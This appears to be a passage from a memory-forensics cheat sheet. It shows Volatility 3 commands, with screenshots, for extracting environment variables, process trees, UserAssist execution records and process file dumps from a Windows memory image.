![image](https://user-images.githubusercontent.com/44196051/122989642-f2fca500-d39a-11eb-8a19-7bcadb83f1d9.png)

Retrieve the enviro variables surronding processes
```bash
vol3 -f image_dump.mem windows.envars.Envars > envs.txt
cut -f2,4,5 envs.txt
```
![image](https://user-images.githubusercontent.com/44196051/122988909-27239600-d39a-11eb-803e-812aa770077b.png)

Get processes with their Parent process
```bash
##This command can fail
vol3 -f image_dump.mem windows.pstree.PsTree

##we can work it our manually if we follow a PID, for example:
cat pslist.txt | grep 4352
  #we can see in the screenshot below, 4352 starts with explorer.exe at 17:39:48.
  # a number of subsequent processes are created, ultimately ending this process id with pwsh at 17:51:19
```
![image](https://user-images.githubusercontent.com/44196051/123014115-6f07e480-d3bd-11eb-9e36-0ea958b9bc2e.png)

UserAssist records info about programs that have been executed
```bash
vol3 -f image_dump.mem windows.registry.userassist > userassist.txt
grep '*' userassist.txt| cut -f2,4,6,10 | pr -Ttd

#Here we get the ntuser.dat, which helps us figure our which user ran what
  # We also get start time of a program, the program itself, and how long the program was run for 
```
![image](https://user-images.githubusercontent.com/44196051/123015484-6f55af00-d3c0-11eb-9230-4a0b0bd75d14.png)


Dump files associated with a process. Usually EXEs and DLLs.
```bash
#zero in on the process you want
cut pslist.txt -f1,3,9,10 | grep -i note | column -t

#then, get that first columns value. The PID
sudo vol3 -f image_dump.mem -o . windows.dumpfiles --pid 2520

#here's an alternate method. Sometimes more reliable, errors out less.
cat pslist.txt | grep 6988
sudo vol3 -f image_dump.mem windows.pslist --pid 6988 --dump
sudo file pid.6988.0x1c0000.dmp
```
![image](https://user-images.githubusercontent.com/44196051/122990657-1ecc5a80-d39c-11eb-85e0-add64e403b25.png)

![image](https://user-images.githubusercontent.com/44196051/123010258-2b5dac80-d3b6-11eb-9352-a43bd1effd87.png)




